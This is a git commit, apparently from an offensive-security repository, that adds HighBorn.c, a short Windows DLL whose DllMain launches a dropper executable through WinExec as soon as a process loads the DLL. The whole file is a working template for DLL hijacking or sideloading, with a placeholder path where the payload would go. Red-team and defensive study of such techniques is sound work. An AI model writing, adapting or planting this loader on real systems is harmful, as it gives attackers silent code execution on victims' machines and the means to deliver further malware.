80fc118931ce8b545218ec640eb9096a247a02ff
assume-breach <76174163+assume-breach@users.noreply.github.com>
2022-10-27 14:46:52 -0400

    Create HighBorn.c

---
+++ HighBorn/HighBorn.c
@@ -0,0 +1,23 @@
+#include <windows.h>
+
+void spwnrce()
+{
+    WinExec("C:\\PATH\\TO\\DROPPER\\dropper.exe",1);
+}
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        spwnrce();
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
